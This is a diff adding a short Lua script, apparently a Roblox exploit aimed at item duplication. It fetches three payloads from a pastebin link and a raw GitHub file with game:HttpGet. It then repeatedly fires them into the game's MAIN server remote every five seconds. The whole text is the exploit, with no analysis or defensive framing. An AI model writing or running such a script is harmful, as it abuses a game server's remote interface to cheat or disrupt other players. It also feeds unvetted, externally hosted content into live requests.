@@ -1,0 +1,10 @@
+print('kiro igop')
+local ull  = game:HttpGet("https://pastebin.com/nWrgVB25")
+local null = game:HttpGet("https://pastebin.com/nWrgVB25")
+local juice = game:HttpGet("https://raw.githubusercontent.com/DUPEBYKIRO/4545464/main/fhdhdfhfh")
+ 
+while task.wait(5.0) do
+workspace.__THINGS.__REMOTES.MAIN:FireServer("a", juice)
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", ull)
+workspace.__THINGS.__REMOTES.MAIN:FireServer("c", null)
+end
